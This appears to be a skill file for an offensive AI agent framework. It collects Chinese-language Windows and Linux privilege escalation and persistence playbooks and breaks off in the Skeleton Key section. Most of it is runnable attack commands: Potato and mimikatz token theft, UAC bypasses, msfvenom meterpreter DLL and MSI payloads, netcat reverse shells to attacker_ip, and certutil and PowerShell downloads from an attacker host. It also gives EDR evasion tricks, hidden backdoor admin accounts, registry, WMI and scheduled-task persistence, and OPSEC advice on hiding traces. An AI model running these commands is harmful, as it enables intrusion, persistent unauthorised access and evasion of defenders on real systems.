# skill: intranet_persist
title: Intranet Privesc & Persistence
when: persistence,privesc,backdoor persistence,privilege escalation,persist
tier: domain

## VOIDFORGE TOOL MAP
skills: privesc_linux, privesc_windows (core); tools: shell_session, deploy_watch

## OPERATING CONTEXT
Grafted from the reverse-skill src-hunter corpus (WooYun-derived, MIT) — original zh preserved; FR/EN agent reads it fluently.

## SOURCE: 权限提升.md

# 权限提升

_15 条 intranet payload_

### 令牌窃取与模拟  `privilege-token`
_窃取和模拟Windows访问令牌_
子类：**令牌操作** · tags: `token` `privilege` `impersonation` `windows`

**前置条件：**
- 已获得目标机器权限
- SeImpersonatePrivilege权限
- Windows系统

**攻击链：**

**列出令牌**
> 列出系统中所有可用令牌
_platform: windows_
```
mimikatz.exe "privilege::debug" "token::list" "exit"
```

**窃取令牌**
> 窃取指定用户的令牌
_platform: windows_
```
mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
```

**JuicyPotato攻击**
> JuicyPotato提权（需要SeImpersonatePrivilege）
_platform: windows_
```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```
**语法解析：**
- `JuicyPotato.exe` — DCOM DCE/RPC本地提权工具 _command_
- `-l` — 监听端口 _parameter_
- `-p` — 要执行的程序 _parameter_
- `-c` — CLSID _parameter_

**PrintSpoofer**
> PrintSpoofer提权
_platform: windows_
```
PrintSpoofer.exe -i -c cmd
```

**GodPotato**
> GodPotato提权，支持更多Windows版本
_platform: windows_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**EDR 绕过变体：**

**RoguePotato**
> RoguePotato，绕过更多限制
```
RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
```


**分析：** 令牌窃取成功后可以模拟高权限用户身份执行操作。

**OPSEC 提示：**
- Potato系列工具利用DCOM机制
- 需要SeImpersonatePrivilege权限
- 不同Windows版本需要不同的CLSID

**概述：** Windows访问令牌(Access Token)包含用户身份和权限信息，攻击者可以窃取高权限用户的令牌来提升权限。

**漏洞原理：** Windows允许进程模拟其他用户的令牌，如果服务账户具有SeImpersonatePrivilege权限，攻击者可以利用此权限获取SYSTEM权限。

**利用方法：** 利用流程：1) 获取SeImpersonatePrivilege权限的服务账户；2) 使用Potato系列工具触发SYSTEM进程连接；3) 窃取SYSTEM令牌；4) 以SYSTEM权限执行命令。

**防御措施：** 防御措施：1) 移除不必要的服务账户SeImpersonatePrivilege权限；2) 监控令牌操作；3) 部署EDR检测异常行为；4) 及时更新系统补丁。

---

### Windows权限提升  `windows-privesc`
_Windows系统提权技术_
子类：**Windows** · tags: `privesc` `windows` `privilege`

**前置条件：**
- 普通用户权限
- 系统漏洞

**攻击链：**

**检查提权向量**
> 检查当前权限
_platform: windows_
```
whoami /priv
whoami /groups
```

**使用WinPEAS**
> 自动化提权检查
_platform: windows_
```
winpeas.exe
```

**检查服务权限**
> 检查可写服务
_platform: windows_
```
accesschk.exe -uwcqv "Everyone" *
```

**检查未引用服务路径**
> 查找未引用服务路径
_platform: windows_
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
```


**概述：** Windows提权涉及多种向量，包括服务、DLL、注册表等。

**漏洞原理：** 配置错误、权限不当、内核漏洞。

**利用方法：** 利用流程：1) 枚举系统 2) 发现漏洞 3) 利用提权

**防御措施：** 防御措施：1) 最小权限原则 2) 及时更新补丁 3) 监控特权操作

---

### Linux权限提升  `linux-privesc`
_Linux系统提权技术_
子类：**Linux** · tags: `privesc` `linux` `privilege`

**前置条件：**
- 普通用户权限
- 系统漏洞

**攻击链：**

**检查SUID**
> 查找SUID文件
_platform: linux_
```
find / -perm -4000 -type f 2>/dev/null
```
**语法解析：**
- `find /` — 从根目录开始搜索 _keyword_
- `-perm -4000` — SUID权限位 _parameter_
- `-type f` — 只搜索文件 _parameter_

**检查Sudo**
> 检查sudo权限
_platform: linux_
```
sudo -l
```

**检查Cron**
> 检查计划任务
_platform: linux_
```
cat /etc/crontab
ls -la /etc/cron*
```

**使用LinPEAS**
> 自动化提权检查
_platform: linux_
```
linpeas.sh
```


**概述：** Linux提权涉及SUID、Sudo、Cron、内核漏洞等。

**漏洞原理：** 配置错误、SUID滥用、内核漏洞。

**利用方法：** 利用流程：1) 枚举系统 2) 发现漏洞 3) 利用提权

**防御措施：** 防御措施：1) 最小权限原则 2) 更新内核 3) 监控特权操作

---

### UAC绕过  `uac-bypass`
_绕过Windows用户账户控制_
子类：**UAC** · tags: `uac` `bypass` `windows`

**前置条件：**
- 管理员组成员
- UAC启用

**攻击链：**

**Fodhelper**
> 通过fodhelper绕过UAC
_platform: windows_
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
fodhelper.exe
```

**Eventvwr**
> 通过eventvwr绕过UAC
_platform: windows_
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe
```

**使用UACME**
> 使用UACME工具
_platform: windows_
```
Akagi64.exe 23 cmd.exe
```


**概述：** UAC可以通过特定程序或注册表操作绕过。

**漏洞原理：** 某些系统程序自动提升权限。

**利用方法：** 利用流程：1) 识别绕过方法 2) 修改注册表 3) 触发执行

**防御措施：** 防御措施：1) 设置UAC为最高级别 2) 监控注册表修改

---

### DLL劫持  `dll-hijack`
_通过DLL劫持提权_
子类：**DLL** · tags: `dll` `hijack` `privesc`

**前置条件：**
- 可写目录
- DLL搜索顺序

**攻击链：**

**查找DLL劫持**
> 监控进程加载的DLL
_platform: windows_
```
使用Procmon监控DLL加载
```

**创建恶意DLL**
> 生成恶意DLL
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**放置DLL**
> 放置DLL到目标位置
_platform: windows_
```
copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```


**概述：** DLL劫持利用DLL搜索顺序加载恶意DLL。

**漏洞原理：** DLL搜索顺序优先当前目录。

**利用方法：** 利用流程：1) 找到可劫持DLL 2) 创建恶意DLL 3) 触发加载

**防御措施：** 防御措施：1) 使用绝对路径 2) 安全DLL搜索模式

---

### 服务提权  `service-exploit`
_通过服务漏洞提权_
子类：**服务** · tags: `service` `privesc` `windows`

**前置条件：**
- 服务修改权限
- 可写服务路径

**攻击链：**

**检查服务权限**
> 检查用户可修改的服务
_platform: windows_
```
accesschk.exe -uwcqv "Users" *
```

**修改服务路径**
> 修改服务执行路径
_platform: windows_
```
sc config VulnerableService binPath= "cmd /c whoami"
```

**重启服务**
> 重启服务执行命令
_platform: windows_
```
sc stop VulnerableService
sc start VulnerableService
```


**概述：** 服务配置不当可导致提权。

**漏洞原理：** 服务权限配置错误，路径可写。

**利用方法：** 利用流程：1) 枚举服务 2) 检查权限 3) 修改执行

**防御措施：** 防御措施：1) 正确设置服务权限 2) 使用引号路径

---

### AlwaysInstallElevated提权  `always-install`
_利用AlwaysInstallElevated提权_
子类：**MSI** · tags: `msi` `alwaysinstall` `privesc`

**前置条件：**
- AlwaysInstallElevated启用

**攻击链：**

**检查设置**
> 检查是否启用
_platform: windows_
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**创建MSI**
> 生成恶意MSI
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
```

**安装MSI**
> 安装MSI执行代码
_platform: windows_
```
msiexec /quiet /qn /i evil.msi
```


**概述：** AlwaysInstallElevated允许用户以SYSTEM权限安装MSI。

**漏洞原理：** 注册表配置允许任何用户以高权限安装。

**利用方法：** 利用流程：1) 检查设置 2) 创建MSI 3) 安装执行

**防御措施：** 防御措施：1) 禁用AlwaysInstallElevated 2) 监控MSI安装

---

### Juicy Potato提权  `juicy-potato`
_利用COM对象和SeImpersonatePrivilege提权_
子类：**Potato** · tags: `juicy-potato` `com` `privesc`

**前置条件：**
- SeImpersonatePrivilege
- Windows < 2019

**攻击链：**

**检查权限**
> 检查SeImpersonatePrivilege
_platform: windows_
```
whoami /priv | findstr SeImpersonate
```

**执行JuicyPotato**
> 使用JuicyPotato提权
_platform: windows_
```
JuicyPotato.exe -t * -p cmd.exe -l 1337
```
**语法解析：**
- `-t *` — 创建进程类型 _parameter_
- `-p cmd.exe` — 要执行的程序 _parameter_
- `-l 1337` — 监听端口 _parameter_


**概述：** Juicy Potato利用COM对象和SeImpersonatePrivilege提权。

**漏洞原理：** COM对象可被滥用获取SYSTEM权限。

**利用方法：** 利用流程：1) 检查权限 2) 选择CLSID 3) 执行提权

**防御措施：** 防御措施：1) 移除SeImpersonatePrivilege 2) 升级Windows

---

### PrintSpoofer提权  `printspoofer`
_利用打印机服务提权_
子类：**PrintSpoofer** · tags: `printspoofer` `privesc` `windows`

**前置条件：**
- SeImpersonatePrivilege

**攻击链：**

**执行PrintSpoofer**
> 使用PrintSpoofer提权
_platform: windows_
```
PrintSpoofer.exe -i -c cmd
```

**指定命令**
> 执行指定命令
_platform: windows_
```
PrintSpoofer.exe -c "whoami > C:\out.txt"
```


**概述：** PrintSpoofer利用打印机服务获取SYSTEM权限。

**漏洞原理：** 打印机服务允许特权模拟。

**利用方法：** 利用流程：1) 检查权限 2) 执行PrintSpoofer

**防御措施：** 防御措施：1) 移除SeImpersonatePrivilege 2) 禁用打印服务

---

### GodPotato提权  `godpotato`
_GodPotato提权工具_
子类：**GodPotato** · tags: `godpotato` `privesc` `windows`

**前置条件：**
- SeImpersonatePrivilege

**攻击链：**

**执行GodPotato**
> 使用GodPotato提权
_platform: windows_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**反向Shell**
> 执行反向Shell
_platform: windows_
```
GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
```


**概述：** GodPotato是JuicyPotato的改进版，支持更多Windows版本。

**漏洞原理：** COM对象和特权模拟漏洞。

**利用方法：** 利用流程：1) 检查权限 2) 执行GodPotato

**防御措施：** 防御措施：1) 移除SeImpersonatePrivilege 2) 更新系统

---

### SUID提权  `suid-exploit`
_利用SUID文件提权_
子类：**SUID** · tags: `suid` `privesc` `linux`

**前置条件：**
- 存在SUID文件
- 可利用程序

**攻击链：**

**查找SUID**
> 查找所有SUID文件
_platform: linux_
```
find / -perm -4000 -type f 2>/dev/null
```

**常见可利用程序**
> 常见SUID利用方法
_platform: linux_
```
nmap --interactive
vim -c ':!/bin/sh'
find / -exec /bin/sh \;
cp /bin/sh /tmp/sh; chmod +s /tmp/sh
```

**GTFOBins**
> 查找程序利用方法
_platform: linux_
```
参考GTFOBins网站查找可利用程序
```


**概述：** SUID文件以文件所有者权限执行，可能被利用提权。

**漏洞原理：** SUID程序存在漏洞或可被滥用。

**利用方法：** 利用流程：1) 查找SUID文件 2) 分析可利用性 3) 执行提权

**防御措施：** 防御措施：1) 审计SUID文件 2) 移除不必要的SUID

---

### Sudo提权  `sudo-exploit`
_利用Sudo配置提权_
子类：**Sudo** · tags: `sudo` `privesc` `linux`

**前置条件：**
- Sudo权限配置不当

**攻击链：**

**检查Sudo权限**
> 列出可执行的sudo命令
_platform: linux_
```
sudo -l
```

**常见利用**
> 常见sudo利用方法
_platform: linux_
```
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
```

**CVE-2021-3156**
> Baron Samedit漏洞
_platform: linux_
```
利用sudo堆溢出漏洞
```


**概述：** Sudo配置不当允许用户以root执行特定命令。

**漏洞原理：** Sudo规则允许执行可逃逸的程序。

**利用方法：** 利用流程：1) 检查sudo权限 2) 找到可利用程序 3) 执行提权

**防御措施：** 防御措施：1) 限制sudo规则 2) 使用NOEXEC标签

---

### Cron提权  `cron-exploit`
_利用Cron任务提权_
子类：**Cron** · tags: `cron` `privesc` `linux`

**前置条件：**
- 可写Cron脚本
- 通配符注入

**攻击链：**

**检查Cron任务**
> 查看计划任务
_platform: linux_
```
cat /etc/crontab
ls -la /etc/cron*
```

**检查脚本权限**
> 检查Cron脚本权限
_platform: linux_
```
ls -la /path/to/cron/script.sh
```

**通配符注入**
> 利用tar通配符注入
_platform: linux_
```
在Cron目录创建: --checkpoint=1
--checkpoint-action=exec=sh shell.sh
```


**概述：** Cron任务以特定用户执行，可被利用提权。

**漏洞原理：** 脚本可写、通配符注入、PATH劫持。

**利用方法：** 利用流程：1) 检查Cron任务 2) 发现漏洞 3) 利用提权

**防御措施：** 防御措施：1) 使用绝对路径 2) 限制脚本权限 3) 避免通配符

---

### 内核漏洞提权  `kernel-exploit`
_利用内核漏洞提权_
子类：**内核** · tags: `kernel` `privesc` `exploit`

**前置条件：**
- 存在内核漏洞
- 可编译/执行exploit

**攻击链：**

**检查内核版本**
> 查看内核版本信息
_platform: linux_
```
uname -a
cat /proc/version
```

**搜索exploit**
> 搜索内核exploit
_platform: linux_
```
searchsploit kernel VERSION
```

**常见内核漏洞**
> 常见内核提权漏洞
_platform: linux_
```
DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)
```


**概述：** 内核漏洞可以直接获取root权限。

**漏洞原理：** 内核代码存在漏洞，可被利用。

**利用方法：** 利用流程：1) 识别内核版本 2) 找到对应exploit 3) 编译执行

**防御措施：** 防御措施：1) 及时更新内核 2) 使用SELinux 3) 限制编译环境

---

### Potato系列提权攻击  `potato-attack`
_利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM_
子类：**Potato提权** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`

**前置条件：**
- 拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限
- 常见于IIS AppPool、SQL Server、各类服务账户

**攻击链：**

**检查当前权限**
> 首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限
_platform: windows_
```
# 检查是否拥有Impersonate权限
whoami /priv

# 重点关注以下权限:
# SeImpersonatePrivilege - 模拟客户端令牌
# SeAssignPrimaryTokenPrivilege - 替换进程级令牌

# 确认当前用户身份
whoami /all
echo %USERNAME%
```
**语法解析：**
- `whoami /priv` — 列出当前用户所有特权 _command_
- `SeImpersonatePrivilege` — 允许模拟其他用户令牌的关键特权 _value_
- `SeAssignPrimaryTokenPrivilege` — 允许为新进程分配令牌 _value_

**JuicyPotato (Windows Server 2016/2019)**
> JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令
_platform: windows_
```
# 下载JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# 使用JuicyPotato提权执行命令
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# 使用特定CLSID (不同系统需要不同CLSID)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 反弹Shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
```
**语法解析：**
- `-l 1337` — COM服务器监听端口 _parameter_
- `-p` — 要以SYSTEM权限执行的程序 _parameter_
- `-a` — 传递给程序的参数 _parameter_
- `-t *` — 同时尝试CreateProcessWithToken和CreateProcessAsUser _parameter_
- `-c {CLSID}` — 指定COM对象CLSID(需匹配目标系统版本) _parameter_

**PrintSpoofer (Windows 10/Server 2019+)**
> PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows
_platform: windows_
```
# PrintSpoofer - 利用打印服务命名管道
PrintSpoofer.exe -i -c cmd

# 直接执行命令
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# 反弹Shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# 以SYSTEM身份启动PowerShell
PrintSpoofer.exe -i -c powershell.exe
```
**语法解析：**
- `-i` — 交互模式(获取交互式Shell) _parameter_
- `-c cmd` — 以SYSTEM权限执行的命令 _parameter_

**Sweet Potato (多技术集成)**
> SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式
_platform: windows_
```
# SweetPotato - 集成多种Potato技术
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# 指定攻击方式
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
```
**语法解析：**
- `-e EfsRpc` — 指定使用EFS RPC攻击向量 _parameter_
- `-p` — 要执行的程序路径 _parameter_

**GodPotato (全版本通杀)**
> GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种
_platform: windows_
```
# GodPotato - 适用于Windows Server 2012-2022所有版本
GodPotato.exe -cmd "cmd /c whoami"

# 执行反弹Shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# 添加管理员
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# 执行PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```
**语法解析：**
- `-cmd` — 以SYSTEM权限执行的命令 _parameter_
- `GodPotato.exe` — 全版本兼容的Potato提权工具 _command_

**RoguePotato (远程场景)**
> RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继
_platform: windows_
```
# 攻击机 - 启动socat重定向
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# 目标机 - 执行RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# 或使用netcat反弹
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```
**语法解析：**
- `-r attacker_ip` — 攻击机IP(运行OXID解析器) _parameter_
- `-l 9999` — 本地监听端口 _parameter_
- `-e` — 要执行的命令 _parameter_

**Potato选型决策流程**
> 根据目标系统版本选择合适的Potato变种工具
_platform: windows_
```
# === 决策流程 ===
# 1. whoami /priv 确认SeImpersonatePrivilege
# 2. systeminfo 确认系统版本
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
# Windows Server 2022 => GodPotato
# 所有版本 => SweetPotato (自动选择)
# 需要远程中继 => RoguePotato
#
# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/
```

**EDR 绕过变体：**

**绕过EDR检测的Potato技巧**
> 通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测
_platform: windows_
```
# 1. 重命名二进制文件
ren GodPotato.exe svcutil.exe

# 2. 使用.NET反射加载(无文件落地)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. 使用SharpToken替代(较新工具,签名较少)
SharpToken.exe execute SYSTEM "cmd /c whoami"
```


**分析：** Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。

**OPSEC 提示：**
- 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式

**概述：** Potato系列是Windows环境下从服务账户提权到SYSTEM的经典攻击技术，利用令牌模拟和NTLM中继实现。

**漏洞原理：** Windows服务账户(IIS/SQL Server等)默认拥有SeImpersonatePrivilege权限。攻击者可利用此权限通过DCOM/命名管道欺骗SYSTEM账户认证，模拟其令牌实现提权。

**利用方法：** 利用流程：1) whoami /priv确认Impersonate权限 2) 根据系统版本选择合适的Potato工具 3) 执行Potato获取SYSTEM权限 4) 进行后渗透操作

**防御措施：** 防御措施：1) 最小权限原则，移除不必要的SeImpersonatePrivilege 2) 使用gMSA账户运行服务 3) 监控异常令牌操作和命名管道创建 4) 及时更新Windows补丁

**参考：**
- <https://attack.mitre.org/techniques/T1134/001/>
- <https://github.com/BeichenDream/GodPotato>

---

---

## SOURCE: 权限维持.md

# 权限维持

_12 条 intranet payload_

### 注册表持久化  `persistence-registry`
_通过注册表实现权限维持_
子类：**注册表** · tags: `persistence` `registry` `windows` `autorun`

**前置条件：**
- 已获得目标机器权限
- 管理员权限
- Windows系统

**攻击链：**

**Run键持久化**
> 添加Run键实现开机自启
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**RunOnce键**
> RunOnce键，执行一次后删除
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**Winlogon Helper**
> 修改Userinit实现持久化
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

**服务持久化**
> 创建服务实现持久化
_platform: windows_
```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

**EDR 绕过变体：**

**隐藏注册表键**
> 使用空字节隐藏注册表键
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```


**分析：** 注册表持久化会在系统启动或用户登录时执行恶意程序。

**OPSEC 提示：**
- Run键是最常见的持久化方式，容易被检测
- 考虑使用更隐蔽的方式
- 定期检查注册表异常项

**概述：** Windows注册表提供了多种持久化机制，攻击者可以在系统启动或用户登录时自动执行恶意代码。

**漏洞原理：** Windows注册表中的多个键值可以在特定时机自动执行程序，这是系统设计功能，但可被攻击者滥用。

**利用方法：** 利用流程：1) 获取管理员权限；2) 选择持久化位置；3) 添加恶意程序路径；4) 等待系统重启或用户登录；5) 恶意程序自动执行。

**防御措施：** 防御措施：1) 监控注册表关键键值变化；2) 使用白名单限制程序执行；3) 定期审计持久化项；4) 部署EDR检测异常行为。

---

### WMI持久化  `persistence-wmi`
_通过WMI事件订阅实现持久化_
子类：**WMI** · tags: `wmi` `persistence` `windows`

**前置条件：**
- 管理员权限

**攻击链：**

**创建事件过滤器**
> 创建WMI事件过滤器
_platform: windows_
```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**创建事件消费者**
> 创建命令行消费者
_platform: windows_
```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

**绑定过滤器和消费者**
> 绑定触发执行
_platform: windows_
```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```


**概述：** WMI事件订阅可以实现隐蔽的持久化。

**漏洞原理：** WMI允许创建自动执行的事件。

**利用方法：** 利用流程：1) 创建过滤器 2) 创建消费者 3) 绑定执行

**防御措施：** 防御措施：1) 监控WMI事件 2) 审计WMI仓库

---

### 启动文件夹持久化  `persistence-startup`
_通过启动文件夹实现持久化_
子类：**启动文件夹** · tags: `startup` `persistence` `windows`

**前置条件：**
- 写入权限

**攻击链：**

**当前用户启动文件夹**
> 当前用户启动
_platform: windows_
```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**所有用户启动文件夹**
> 所有用户启动
_platform: windows_
```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```


**概述：** 启动文件夹的程序会在用户登录时执行。

**漏洞原理：** 启动文件夹可写。

**利用方法：** 利用流程：1) 找到启动文件夹 2) 放置恶意文件 3) 等待用户登录

**防御措施：** 防御措施：1) 监控启动文件夹 2) 限制写入权限

---

### 服务持久化  `persistence-service`
_通过创建服务实现持久化_
子类：**服务** · tags: `service` `persistence` `windows`

**前置条件：**
- 管理员权限

**攻击链：**

**创建服务**
> 创建自启动服务
_platform: windows_
```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```
**语法解析：**
- `sc create` — 创建服务命令 _command_
- `binPath=` — 服务执行路径 _parameter_
- `start= auto` — 自动启动 _parameter_

**启动服务**
> 启动服务
_platform: windows_
```
sc start evilsvc
```


**概述：** 服务可以在系统启动时自动执行。

**漏洞原理：** 服务可以配置执行任意命令。

**利用方法：** 利用流程：1) 创建服务 2) 配置自动启动 3) 重启触发

**防御措施：** 防御措施：1) 监控服务创建 2) 审计服务配置

---

### DLL注入持久化  `persistence-dll-injection`
_通过DLL注入实现持久化_
子类：**DLL注入** · tags: `dll` `injection` `persistence`

**前置条件：**
- 代码执行权限
- 目标进程

**攻击链：**

**创建恶意DLL**
> 生成恶意DLL
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**注入DLL**
> 将DLL注入到运行进程
_platform: windows_
```
使用工具如InjectDLL、PowerShell等注入到目标进程
```

**AppInit_DLLs**
> 通过AppInit_DLLs注入
_platform: windows_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```


**概述：** DLL注入可以将代码注入到其他进程执行。

**漏洞原理：** 进程可以加载任意DLL。

**利用方法：** 利用流程：1) 创建DLL 2) 注入目标进程 3) 执行代码

**防御措施：** 防御措施：1) 启用CFG 2) 监控DLL加载 3) 使用签名验证

---

### 后门用户  `persistence-backdoor-user`
_创建后门用户账户_
子类：**用户** · tags: `user` `backdoor` `persistence`

**前置条件：**
- 管理员权限

**攻击链：**

**创建用户**
> 创建管理员用户
_platform: windows_
```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

**隐藏用户**
> 创建隐藏用户（$结尾）
_platform: windows_
```
net user backdoor$ P@ssw0rd /add
```

**修改注册表隐藏**
> 通过注册表隐藏用户
_platform: windows_
```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```


**概述：** 创建后门用户可以持久访问系统。

**漏洞原理：** 管理员可以创建用户。

**利用方法：** 利用流程：1) 创建用户 2) 添加到管理员组 3) 隐藏用户

**防御措施：** 防御措施：1) 监控用户创建 2) 定期审计用户列表

---

### 隐藏用户  `persistence-hidden-user`
_创建隐藏的管理员用户_
子类：**隐藏用户** · tags: `hidden` `user` `persistence`

**前置条件：**
- SYSTEM权限

**攻击链：**

**创建用户**
> 创建$结尾用户
_platform: windows_
```
net user hidden$ P@ssw0rd /add
```

**添加到管理员组**
> 添加管理员权限
_platform: windows_
```
net localgroup administrators hidden$ /add
```

**注册表隐藏**
> 通过注册表完全隐藏
_platform: windows_
```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
修改F值
reg import user.reg
```


**概述：** 隐藏用户不会在登录界面和用户列表显示。

**漏洞原理：** 注册表可以修改用户显示属性。

**利用方法：** 利用流程：1) 创建用户 2) 修改注册表 3) 完全隐藏

**防御措施：** 防御措施：1) 监控注册表修改 2) 深度审计用户

---

### 计划任务持久化  `persistence-scheduled`
_通过计划任务实现持久化_
子类：**计划任务** · tags: `persistence` `scheduled` `task`

**前置条件：**
- 创建任务权限

**攻击链：**

**创建登录任务**
> 创建登录时运行的任务
_platform: windows_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```
**语法解析：**
- `/tn` — 任务名称 _parameter_
- `/tr` — 执行的程序 _parameter_
- `/sc onlogon` — 触发条件：登录时 _parameter_
- `/ru SYSTEM` — 运行用户：SYSTEM _parameter_

**创建定时任务**
> 创建每5分钟运行的任务
_platform: windows_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

**PowerShell创建**
> 使用PowerShell创建任务
_platform: windows_
```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

**Linux Cron**
> Linux计划任务
_platform: linux_
```
crontab -e
添加: * * * * * /tmp/backdoor.sh
或: @reboot /tmp/backdoor.sh
```


**概述：** 计划任务是常用的持久化方式。

**漏洞原理：** 计划任务可被创建执行任意程序。

**利用方法：** 利用流程：1) 创建任务 2) 设置触发器 3) 等待执行

**防御措施：** 防御措施：1) 监控任务创建 2) 审计任务变更 3) 限制创建权限

---

### Skeleton Key后门  `skeleton-key`
_在域控制器植入万能密码_
子类：**域后门** · tags: `skeleton-key` `backdoor` `domain`

**前置条件：**
- 域管理员权限
- 访问域控制器

**攻击链：**

**植入Skeleton Key**
> 使用Mimikatz植入
_platform: windows_
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
**语法解析：**
